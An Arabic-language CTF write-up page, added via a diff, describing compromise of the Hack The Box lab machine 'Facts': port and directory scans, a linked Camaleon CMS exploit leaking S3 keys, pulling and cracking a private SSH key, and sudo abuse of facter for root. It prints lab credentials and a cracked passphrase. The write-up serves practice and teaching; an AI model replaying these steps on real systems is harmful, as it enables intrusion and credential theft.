@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+  <meta name="theme-color" content="#07110d">
+  <meta name="color-scheme" content="dark light">
+  <meta name="description" content="تقرير CTF تقني لتحدي Facts HTB Machine على منصة Hack The Box.">
+  <title>Facts HTB Machine | Ft7y.Sec</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600;700&family=Tajawal:wght@300;400;500;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/aos/2.3.4/aos.css">
+  <link rel="stylesheet" href="../style.css">
+  <link rel="icon" href="../avatar.png" type="image/png">
+</head>
+<body>
+  <a class="skip-link" href="#main-content">تخطي إلى المحتوى</a>
+  <div class="scroll-progress" id="scroll-progress" aria-hidden="true"></div>
+  <div class="page-noise" aria-hidden="true"></div>
+  <canvas id="particles-canvas"></canvas>
+  <header class="navbar" id="navbar">
+    <div class="logo"><a href="../index.html#home">Ft7y<span>.Sec</span></a></div>
+    <nav class="nav-links" id="nav-menu" aria-label="التنقل الرئيسي"><ul>
+      <li><a href="../index.html#home">الرئيسية</a></li>
+      <li><a href="../pentest.html">اختبار الاختراق</a></li>
+      <li><a href="../appsec.html">أمن التطبيقات</a></li>
+      <li><a href="../automation.html">البرمجة والأتمتة</a></li>
+      <li><a href="../systems-labs.html">الأنظمة والمعامل</a></li>
+      <li><a href="../writeups.html">CTF Write-ups</a></li>
+      <li><a href="../index.html#contact">تواصل معي</a></li>
+    </ul></nav>
+    <div class="nav-actions">
+      <button id="theme-toggle" class="btn-secondary" type="button" title="تبديل الوضع" aria-label="تبديل الوضع"><i class="fa-solid fa-moon"></i></button>
+      <button class="mobile-toggle" id="mobile-toggle" type="button" aria-label="القائمة"><i class="fa-solid fa-bars"></i></button>
+    </div>
+  </header>
+  <main id="main-content" class="subpage-container ctf-report-page">
+    <article class="ctf-report-article">
+      <header class="subpage-hero ctf-report-hero" data-aos="fade-up">
+        <nav class="breadcrumb-nav" aria-label="مسار التنقل"><a href="../index.html"><i class="fa-solid fa-house"></i> الرئيسية</a><span class="sep">/</span><a href="index.html">تقارير CTF</a><span class="sep">/</span><span class="current">Facts HTB Machine</span></nav>
+        <div class="writeup-header"><span class="platform-tag htb"><i class="fa-solid fa-cube"></i> Hack The Box</span><span class="ctf-directory-label"><i class="fa-solid fa-shield-halved"></i> بيئة تدريبية مصرح بها</span></div>
+        <h1 class="subpage-hero-title">Facts HTB Machine</h1>
+        <p class="subpage-hero-desc">توثيق تقني محفوظ من المصدر الأصلي في Notion، يشمل الخطوات والأوامر والنتائج ولقطات الشاشة المتاحة.</p>
+        <a href="index.html" class="btn-outline ctf-back-link"><i class="fa-solid fa-arrow-right"></i> العودة إلى تقارير CTF</a>
+      </header>
+      <div class="ctf-report-content" data-aos="fade-up"><h2>بسم الله الرحمن الرحيم</h2><p>---</p><h2>تقرير اختبار اختراق احترافي:                       Facts Machine  (Hack The Box)</h2><figure class="ctf-report-figure"><img src="../assets/images/ctfs/facts-1.png" alt="لقطة شاشة من تقرير Facts HTB Machine" loading="lazy"><figcaption>لقطة شاشة من تقرير Facts HTB Machine</figcaption></figure><p>&gt; الخطوة الاولى بالطبع هي الاتصال بال VPN  وتشغيل الالة المستهدفة وانتظر حتى تحصل على عنوان ال IP  الخاص بالهدف</p><h3>1. ملخص تنفيذي (Executive Summary)</h3><p>تم إجراء اختبار اختراق اخلاقي ومصرح به لمحاكي المختبر <strong>Facts</strong> على منصة <strong>Hack The Box</strong>. الهدف من هذه العملية هو تقييم الوضع الأمني للماشين، وتحديد الثغرات الأمنية المتاحة، واستغلالها وصولاً إلى الصلاحيات الكاملة (<code dir="ltr">root</code>)، ثم توثيق الإجراءات التصحيحية اللازمة.</p><h4>نتائج الفحص الأساسية:</h4><ul class="ctf-report-list"><li><strong>اسم الماشين:</strong> Facts</li><li><strong>عنوان الـ IP:</strong> <code dir="ltr">10.129.48.15</code></li><li><strong>مستوى الصعوبة:</strong> متوسط (Medium)</li><li><strong>نطاق الثغرات المكتشفة:</strong></li></ul><ol class="ctf-report-list"><li>تسريب بيانات حساسة وسوء إعدادات في الخدمة السحابية (S3 Bucket Misconfiguration).</li><li>ثغرة رفع صلاحيات محملة محلياً عبر أداة جمع الحقائق (Privilege Escalation via Facter).</li></ol><p>---</p><h3>2. مرحلة الاستطلاع وفحص المنافذ (Reconnaissance &amp; Port Scanning)</h3><p>بدأت العملية بإجراء فحص كامل للمنافذ المفتوحة والخدمات التي تعمل عليها باستخدام أداة <code dir="ltr">Nmap</code> لتحديد خط الهجوم الأول (Attack Surface).</p><h4><code dir="ltr">الأمر المستخدم sudo nmap -sV -sC -Pn &lt;Taregt-Ip&gt;                       :1</code></h4><figure class="ctf-report-figure"><img src="../assets/images/ctfs/facts-2.png" alt="لقطة شاشة من تقرير Facts HTB Machine" loading="lazy"><figcaption>لقطة شاشة من تقرير Facts HTB Machine</figcaption></figure><h4>هناك 2 منافذ تعمل web (port 80) &amp; (ssh port 22)</h4><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">javascript</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code>PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89 (ECDSA)
+|_  256 a3:ad:6b:2f:4a:bf:6f:48:ac:81:b9:45:3f:de:fb:87 (ED25519)
+80/tcp    open  http    nginx 1.26.3 (Ubuntu)
+|_http-title: facts
+|_http-server-header: nginx/1.26.3 (Ubuntu)</code></pre></section><p>عند قيامنا بتحليل تلك البيانات نلاحظ الاتي :</p><ul class="ctf-report-list"><li><strong>منفذ 22 (SSH):</strong> يعمل بإصدار آمن نسبياً ولم يظهر فيه ثغرات مباشرة (بشكل أولي).&lt;br&gt;&lt;br&gt;</li><li><strong>منفذ 80 (HTTP):</strong> يعمل بخادم <code dir="ltr">nginx</code> ويعرض موقعاً باسم <code dir="ltr">facts</code>.&lt;br&gt;&lt;br&gt;</li></ul><p>&gt; قمنا باضافة النطاق الى ملف ال  //etc/hosts/  بستخدام الامر التالي : ↓↓↓↓ وقمنا باستكشافه من المتصفح</p><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">javascript</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code>echo&quot;&lt;Target-IP&gt; facts.htb&quot; | sudo tee -a /etc/hosts</code></pre></section><figure class="ctf-report-figure"><img src="../assets/images/ctfs/facts-3.png" alt="لقطة شاشة من تقرير Facts HTB Machine" loading="lazy"><figcaption>لقطة شاشة من تقرير Facts HTB Machine</figcaption></figure><figure class="ctf-report-figure"><img src="../assets/images/ctfs/facts-4.png" alt="لقطة شاشة من تقرير Facts HTB Machine" loading="lazy"><figcaption>لقطة شاشة من تقرير Facts HTB Machine</figcaption></figure><p>&gt; باستخدام <strong>gobuster</strong>، قمنا بتعداد النطاق الفرعي وحصلنا على عدد قليل من الزيارات، أبرزها /admin.</p><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">javascript</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code>   gobuster dir -u http://facts.htb/ -w /usr/share/wordlists/dirb/common.txt
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://facts.htb/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+
+/admin                (Status: 302) [Size: 0] [--&gt; http://facts.htb/admin/login]
+
+/admin.cgi            (Status: 302) [Size: 0] [--&gt; http://facts.htb/admin/login]
+/admin.php            (Status: 302) [Size: 0] [--&gt; http://facts.htb/admin/login]
+/admin.pl             (Status: 302) [Size: 0] [--&gt; http://facts.htb/admin/login]
+/ajax                 (Status: 200) [Size: 0]
+/cache                (Status: 200) [Size: 11116]
+/captcha              (Status: 200) [Size: 1310]
+/config               (Status: 200) [Size: 11119]
+/cvs                  (Status: 200) [Size: 11110]
+/CVS                  (Status: 200) [Size: 11110]
+</code></pre></section><aside class="ctf-callout"><p>وعند زيارتنا لصفحة تسجيل الدخول نجد اننا يمكننا  عمل حساب جديد وتسجيل الدخول الى لوحة التحكم وبالطبع قمنا بعمل حساب جديد وتسجيل الدخول الى لوحة تحكم المستخدم</p></aside><figure class="ctf-report-figure"><img src="../assets/images/ctfs/facts-5.png" alt="لقطة شاشة من تقرير Facts HTB Machine" loading="lazy"><figcaption>لقطة شاشة من تقرير Facts HTB Machine</figcaption></figure><p>&gt; لاحظ ان <strong>Camaleon CMS v2.9.0 </strong>قديم جدًا،   وهو عرضة لـ  CVE-2025–2304  ويمكننا الحصول على استغلال للثغرة من خلال البحث عنها في   *<em>Github   </em><strong><em>او قم بنسخه من هنا</em></strong><em> </em><strong><em>&lt;mention-page url=&quot;https://app.notion.com/p/3587739eb412808ca763e3c53fbdecbe&quot;&gt;CVE-2025-2304 Exploit&lt;/mention-page&gt;</em></strong><em> </em>*</p><p><a href="https://github.com/Alien0ne/CVE-2025-2304/blob/main/exploit.py" target="_blank" rel="noopener noreferrer">https://github.com/Alien0ne/CVE-2025-2304/blob/main/exploit.py</a></p><p>&gt; قمنا بنسخ ملف الاستغلال على جهازنا بأسم    <a href="http://privsec.py" target="_blank" rel="noopener noreferrer"><strong>privsec.py</strong></a><strong>  </strong><strong>و قمنا بتشغيله ونجح الاستغلال وحصلنا   على مفاتيح سحابة أمازون (AWS S3 Credentials)  وهيا مفتاح الخطوة القادمة </strong></p><figure class="ctf-report-figure"><img src="../assets/images/ctfs/facts-6.png" alt="لقطة شاشة من تقرير Facts HTB Machine" loading="lazy"><figcaption>لقطة شاشة من تقرير Facts HTB Machine</figcaption></figure><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">javascript</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code>[+]Extracting S3 Credentials
+   s3 access key: AKIAAE3D138BD9D7E7A5
+   s3 secret key: kqa8zKKi7NHHRyCsieKuEicpV2GiNrF9MAlI5Wf7
+   s3 endpoint: http://localhost:54321
+[+]Reverting User Role
+</code></pre></section><p>الان لكي نتمكن من التعامل مع بيئة <strong>AWS  </strong>(<strong>خدمات تخزين امازون السحابية</strong>) يجب علينا استخدام اداة  (<strong>awscli</strong>) هي الأداة الرسمية التي توفرها شركة أمازون للتحكم في خدماتها السحابية مباشرة من واجهة الأوامر (Terminal).</p><p>يمكننا تثبيتها ان لم تكن موجودة من خلال الامر التالي   \[ <strong>sudo apt install awscli</strong>\]</p><p>&lt;br&gt;اولا يجب علينا تهيئة الأداة (<code dir="ltr">aws configure</code>) واضافة المفاتيح بالشكل التالي : &lt;br&gt;</p><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">javascript</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code>aws configure --profile facts
+AWS Access Key ID [None]: AKIAAE3D138BD9D7E7A5
+AWS Secret Access Key [None]: kqa8zKKi7NHHRyCsieKuEicpV2GiNrF9MAlI5Wf7
+Default region name [None]: 
+Default output format [None]: </code></pre></section><figure class="ctf-report-figure"><img src="../assets/images/ctfs/facts-7.png" alt="لقطة شاشة من تقرير Facts HTB Machine" loading="lazy"><figcaption>لقطة شاشة من تقرير Facts HTB Machine</figcaption></figure><p>الان نقوم باستكشاف ما يوجد داخل الـ Bucket. من خلال الامر التالي :</p><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">javascript</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code>aws --endpoint-url http://facts.htb:54321 --profile facts s3 ls
+2025-09-11 15:06:52 internal
+2025-09-11 15:06:52 randomfacts</code></pre></section><figure class="ctf-report-figure"><img src="../assets/images/ctfs/facts-8.png" alt="لقطة شاشة من تقرير Facts HTB Machine" loading="lazy"><figcaption>لقطة شاشة من تقرير Facts HTB Machine</figcaption></figure><ul class="ctf-report-list"><li>حصلنا على <code dir="ltr">randomfacts</code>:   ودي غالباً عليها ميديا أو صور الموقع.</li><li>وحصلنا ايضا على<code dir="ltr"> internal</code>: ودي (High Value Target)، لأنها غالباً بتحتوي على ملفات إعدادات أو كود داخلي.</li></ul><p>&gt; &lt;br&gt;قمنا بفحص <code dir="ltr">internal</code>: وتصفية النتائج باستخدام Grep  للبحث عن الملفات المهمة فقط من بين    العديد من النتائج الموجودة للتشتيت&lt;br&gt;</p><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">javascript</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code>┌──(kali㉿kali)-[~/Downloads]
+└─$ aws --endpoint-url http://facts.htb:54321 --profile facts s3 ls s3://internal --recursive | grep -E &quot;config|database|settings|.env&quot;
+2026-01-08 20:45:15         32 .bundle/cache/compact_index/rubygems.org.443.29b0360b937aa4d161703e6160654e47/info-etags/aws-sdk-appconfig-da6a9e8efde98ebec5fdcee0f5da28ea
+2026-01-08 20:45:15         32 .bundle/cache/compact_index/rubygems.org.443.29b0360b937aa4d161703e6160654e47/info-etags/aws-sdk-appconfigdata-28686d54081c58f0c3c241ec6b818223
+2026-01-08 20:45:32         32 .bundle/cache/compact_index/rubygems.org.443.29b0360b937aa4d161703e6160654e47/info-etags/aws-sdk-configservice-c4166bcadb607dec061b0e2e856876cf
+2026-01-08 20:45:33         32 .bundle/cache/compact_index/rubygems.org.443.29b0360b937aa4d161703e6160654e47/info-etags/aws-sdk-databasemigrationservice-fbe1b7205d5042547cd72e17b400ca64
+2026-01-08 20:45:49         32 .bundle/cache/compact_index/rubygems.org.443.29b0360b937aa4d161703e6160654e47/info-etags/aws-sdk-migrationhubconfig-efd666f46c97e849591db8fd0c055eea
+2026-01-08 20:45:52         32 .bundle/cache/compact_index/rubygems.org.443.29b0360b937aa4d161703e6160654e47/info-etags/aws-sdk-route53recoverycontrolconfig-9eac628f6293c2afadb6fd4c07859877
+2026-01-08 20:46:29         32 .bundle/cache/compact_index/rubygems.org.443.29b0360b937aa4d161703e6160654e47/info-etags/aws-sdk-taxsettings-e602c8f5c7ce76b135ccbdcc57b201b4
+2026-01-08 20:46:29         32 .bundle/cache/compact_index/rubygems.org.443.29b0360b937aa4d161703e6160654e47/info-etags/configuration-ccd1066343c95877b75b79d47c36bebe
+2026-01-08 20:46:29         32 .bundle/cache/compact_index/rubygems.org.443.29b0360b937aa4d161703e6160654e47/info-etags/cucumber-ci-environment-dcfdecb840d853485904f151ee909b30
+2026-01-08 20:46:30         32 .bundle/cache/compact_index/rubygems.org.443.29b0360b937aa4d161703e6160654e47/info-etags/database_cleaner-12a6aaf38db0e7d014f144770e2f58b9
+2026-01-08 20:46:30         32 .bundle/cache/compact_index/rubygems.org.443.29b0360b937aa4d161703e6160654e47/info-etags/database_cleaner-active_record-59ca292bebcb964e2f2acf70ea8b3261
+2026-01-08 20:46:30         32 .bundle/cache/compact_index/rubygems.org.443.29b0360b937aa4d161703e6160654e47/info-etags/database_cleaner-core-2df19ecc2cf141ac5fbc78f3262bbaf0
+2026-01-08 20:46:30         32 .bundle/cache/compact_index/rubygems.org.443.29b0360b937aa4d161703e6160654e47/info-etags/dotenv-3f5ead17822b4cd022532df7dc2479c4
+2026-01-08 20:46:30         32 .bundle/cache/compact_index/rubygems.org.443.29b0360b937aa4d161703e6160654e47/info-etags/dotenv-deployment-cc21279a536754faed8983e6551be4a7
+2026-01-08 20:46:34         32 .bundle/cache/compact_index/rubygems.org.443.29b0360b937aa4d161703e6160654e47/info-etags/google-cloud-env-a81ddb5fc20b0357c764ca3e75a2301f
+2026-01-08 20:46:38         32 .bundle/cache/compact_index/rubygems.org.443.29b0360b937aa4d161703e6160654e47/info-etags/nenv-b7be93466d6f9b962acb2cafb17dfeea
+2026-01-08 20:46:39         32 .bundle/cache/compact_index/rubygems.org.443.29b0360b937aa4d161703e6160654e47/info-etags/pkg-config-8f4e4e875f8521719dd560c40e5585d3
+2026-01-08 20:46:41      10217 .bundle/cache/compact_index/rubygems.org.443.29b0360b937aa4d161703e6160654e47/info/aws-sdk-appconfig
+2026-01-08 20:46:41       6666 .bundle/cache/compact_index/rubygems.org.443.29b0360b937aa4d161703e6160654e47/info/aws-sdk-appconfigdata
+2026-01-08 20:46:41      21100 .bundle/cache/compact_index/rubygems.org.443.29b0360b937aa4d161703e6160654e47/info/aws-sdk-configservice
+2026-01-08 20:46:41      20264 .bundle/cache/compact_index/rubygems.org.443.29b0360b937aa4d161703e6160654e47/info/aws-sdk-databasemigrationservice
+2026-01-08 20:46:43       8574 .bundle/cache/compact_index/rubygems.org.443.29b0360b937aa4d161703e6160654e47/info/aws-sdk-migrationhubconfig
+2026-01-08 20:46:43       7464 .bundle/cache/compact_index/rubygems.org.443.29b0360b937aa4d161703e6160654e47/info/aws-sdk-route53recoverycontrolconfig
+2026-01-08 20:46:44       4859 .bundle/cache/compact_index/rubygems.org.443.29b0360b937aa4d161703e6160654e47/info/aws-sdk-taxsettings
+2026-01-08 20:46:44        733 .bundle/cache/compact_index/rubygems.org.443.29b0360b937aa4d161703e6160654e47/info/configuration
+2026-01-08 20:46:44       1475 .bundle/cache/compact_index/rubygems.org.443.29b0360b937aa4d161703e6160654e47/info/cucumber-ci-environment
+2026-01-08 20:46:44       5255 .bundle/cache/compact_index/rubygems.org.443.29b0360b937aa4d161703e6160654e47/info/database_cleaner
+2026-01-08 20:46:44       1655 .bundle/cache/compact_index/rubygems.org.443.29b0360b937aa4d161703e6160654e47/info/database_cleaner-active_record
+2026-01-08 20:46:44        373 .bundle/cache/compact_index/rubygems.org.443.29b0360b937aa4d161703e6160654e47/info/database_cleaner-core
+2026-01-08 20:46:45       4639 .bundle/cache/compact_index/rubygems.org.443.29b0360b937aa4d161703e6160654e47/info/dotenv
+2026-01-08 20:46:45        354 .bundle/cache/compact_index/rubygems.org.443.29b0360b937aa4d161703e6160654e47/info/dotenv-deployment
+2026-01-08 20:46:55       2857 .bundle/cache/compact_index/rubygems.org.443.29b0360b937aa4d161703e6160654e47/info/google-cloud-env
+2026-01-08 20:47:04        490 .bundle/cache/compact_index/rubygems.org.443.29b0360b937aa4d161703e6160654e47/info/nenv
+2026-01-08 20:47:06       5350 .bundle/cache/compact_index/rubygems.org.443.29b0360b937aa4d161703e6160654e47/info/pkg-config
+                          </code></pre></section><p><strong>قمنا بلبحث عن ملفات (.ssh)  وبالفعل لقد حددنا موقع مفتاح SSH خاص (id_ed25519) وملف Author_keys </strong></p><figure class="ctf-report-figure"><img src="../assets/images/ctfs/facts-9.png" alt="لقطة شاشة من تقرير Facts HTB Machine" loading="lazy"><figcaption>لقطة شاشة من تقرير Facts HTB Machine</figcaption></figure><p>ثم قمنا  بسحب مفتاح ال ssh هذا الى جهازنا المحلي من خلال الامر التالي  واعطائه الصلاحيات اللازمة :</p><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">javascript</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code>aws --endpoint-url http://facts.htb:54321 --profile facts s3 cp s3://internal/.ssh/id_ed25519 ./id_ed25519_htb
+download: s3://internal/.ssh/id_ed25519_htb to ./id_ed25519_htb 
+
+سيرفض SSH استخدام مفتاح خاص &quot;مفتوح&quot; للغاية. يجب عليك تقييد الأذونات:
+chmod 600 id_ed25519_htb</code></pre></section><p>&gt; قمنا بفك تشفير المفتاح باستخدام الاوامر التالية : وبالفعل خرجت لنا كلمة السر <strong><em>dragonballz</em></strong></p><figure class="ctf-report-figure"><img src="../assets/images/ctfs/facts-10.png" alt="لقطة شاشة من تقرير Facts HTB Machine" loading="lazy"><figcaption>لقطة شاشة من تقرير Facts HTB Machine</figcaption></figure><p>&gt; الان يمكننا تسجيل الدخول عبر ال <strong>ssh </strong>والوصول الاولي الى النظام  والحصول على ال User Flag باستخدام اسم المستخدم        Username=(<strong>trivia) </strong></p><figure class="ctf-report-figure"><img src="../assets/images/ctfs/facts-11.png" alt="لقطة شاشة من تقرير Facts HTB Machine" loading="lazy"><figcaption>لقطة شاشة من تقرير Facts HTB Machine</figcaption></figure><p>&gt; الان بقى لنا ان نقوك بالخطوة الاخيرة رفع صلاحياتنا داخل النظام والحصول على ال Root Flag</p><aside class="ctf-callout"><p>بعد التحقق من امتيازات المستخدم(<strong>Trivia</strong>) وجدنا برنامجًا مثيرًا للاهتمام يسمى <strong><code dir="ltr">usr/bin/facter/</code></strong><strong> </strong></p></aside><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">javascript</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code>trivia@facts:~$ sudo -l 
+Matching Defaults entries for trivia on facts:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User trivia may run the following commands on facts:
+    (ALL) NOPASSWD: /usr/bin/facter
+trivia@facts:~$</code></pre></section><p>&gt; <strong>وكان مسموحا للمستخدم Trivia ان يقوم بتشغيل هذا البرنامج بصلاحيات ال Root وبدون باسورد وقمنا        بستغلال ذلك لتصعيد امتيازاتنا الى ال  </strong><strong>Root user</strong></p><figure class="ctf-report-figure"><img src="../assets/images/ctfs/facts-12.png" alt="لقطة شاشة من تقرير Facts HTB Machine" loading="lazy"><figcaption>لقطة شاشة من تقرير Facts HTB Machine</figcaption></figure><figure class="ctf-report-figure"><img src="../assets/images/ctfs/facts-13.png" alt="لقطة شاشة من تقرير Facts HTB Machine" loading="lazy"><figcaption>لقطة شاشة من تقرير Facts HTB Machine</figcaption></figure></div>
+      <footer class="ctf-report-end"><a href="index.html" class="btn-primary"><i class="fa-solid fa-arrow-right"></i> كل تقارير CTF</a></footer>
+    </article>
+  </main>
+  <footer class="footer"><div class="footer-content">
+    <div class="footer-logo">Ft7y<span>.Sec</span></div>
+    <div class="footer-links">
+      <a href="../index.html#home">الرئيسية</a><a href="../pentest.html">اختبار الاختراق</a><a href="../appsec.html">أمن التطبيقات</a><a href="../automation.html">البرمجة والأتمتة</a><a href="../systems-labs.html">الأنظمة والمعامل</a><a href="../writeups.html">CTF Write-ups</a>
+    </div>
+    <p>© 2026 Ft7y.Sec. جميع الحقوق محفوظة.</p>
+  </div></footer>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/aos/2.3.4/aos.js"></script>
+  <script src="../script.js"></script>
+</body>
+</html>
